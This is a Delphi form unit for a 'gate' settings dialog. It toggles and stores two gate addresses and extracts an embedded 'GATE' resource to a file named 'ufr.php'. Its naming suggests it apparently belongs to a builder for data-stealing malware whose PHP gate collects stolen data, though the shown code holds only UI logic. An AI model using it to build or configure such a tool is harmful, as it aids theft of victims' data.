unit GateUseForm;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, sButton, sCheckBox, sEdit;

type
  TForm8 = class(TForm)
    Edit12: TsEdit;
    CheckBox16: TsCheckBox;
    Edit13: TsEdit;
    Button12: TsButton;
    Button1: TsButton;
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button12Click(Sender: TObject);
    procedure CheckBox16Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form8: TForm8;

implementation

uses unit3;

{$R *.dfm}

procedure TForm8.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  EnableWindow(unit3.Form3.Handle, true);
  BringWindowToTop(unit3.Form3.Handle);
  Action := caFree;
end;

procedure TForm8.CheckBox16Click(Sender: TObject);
begin
if checkbox16.checked then
  begin
    edit12.Enabled:=true;
    edit13.Enabled:=true;
  end
else
  begin
    edit12.Enabled:=false;
    edit13.Enabled:=false;
  end;
end;

procedure TForm8.Button12Click(Sender: TObject);
begin
form3.savedialog3.FileName:='ufr.php';
if form3.savedialog3.Execute then
Form3.ExtractRes('GATE', 'GATE', form3.savedialog3.FileName);
end;

procedure TForm8.Button1Click(Sender: TObject);
begin
  bs.use_gate:=checkbox16.Checked;
  bs.gate1:=edit12.Text;
  bs.gate2:=edit13.Text;
  EnableWindow(unit3.Form3.Handle, true);
  BringWindowToTop(unit3.Form3.Handle);
  form8.Release;
end;

procedure TForm8.FormCreate(Sender: TObject);
begin
  checkbox16.Checked:=bs.use_gate;
  edit12.Text:=bs.gate1;
  edit13.Text:=bs.gate2;
end;

end.
